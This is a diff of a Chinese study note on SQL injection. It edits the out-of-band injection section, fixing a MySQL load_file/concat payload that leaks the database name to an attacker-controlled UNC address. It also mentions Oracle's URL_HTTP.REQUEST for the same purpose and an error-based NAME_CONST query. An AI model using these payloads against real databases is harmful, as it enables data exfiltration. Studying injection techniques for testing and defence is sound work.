@@ -238,7 +238,7 @@ select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
 
 #### OOB注入
 
-* 基本原理：OOB即使Out-Of-Band 带外通道技术，用于攻击者通过另一种方式确认和利用没有直接回显的漏洞。一次成功的OOB攻击基于 有漏洞的系统 和 外围防火墙的出站策略。对于SQL注入无法进行SQl盲注时，可以让数据库向我们所控制的服务器（例如DNS服务器）发起请求，我们通过查看服务器上的请求记录，来判断是否注入成功。	例如，使用mysql中的load_file(concat("\\\\\\\",(select database()),".UNC地址"))携带敏感信息发起对某个unc地址的请求。UNC路径只有Windows下有，所以在linux下无法获取数据。
+* 基本原理：OOB即使Out-Of-Band 带外通道技术，用于攻击者通过另一种方式确认和利用没有直接回显的漏洞。一次成功的OOB攻击基于 有漏洞的系统 和 外围防火墙的出站策略。对于SQL注入无法进行SQl盲注时，可以让数据库向我们所控制的服务器（例如DNS服务器）发起请求，我们通过查看服务器上的请求记录，来判断是否注入成功。	例如，使用mysql中的load_file(concat("\\\\\\",(select database()),".UNC地址"))携带敏感信息发起对某个unc地址的请求。UNC路径只有Windows下有，所以在linux下无法获取数据。
 
   Oracle下有函数URL_HTTP.REQUEST进行带外注入。
 
@@ -254,7 +254,7 @@ select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
 
 ![image-20230809212915599](.\images\image-20230809212915599.png)
 
-
+这里最外部应该缺了一个loadl_file
 
 ### 基于如何处理输入的 SQL 查询（数据类型）
 
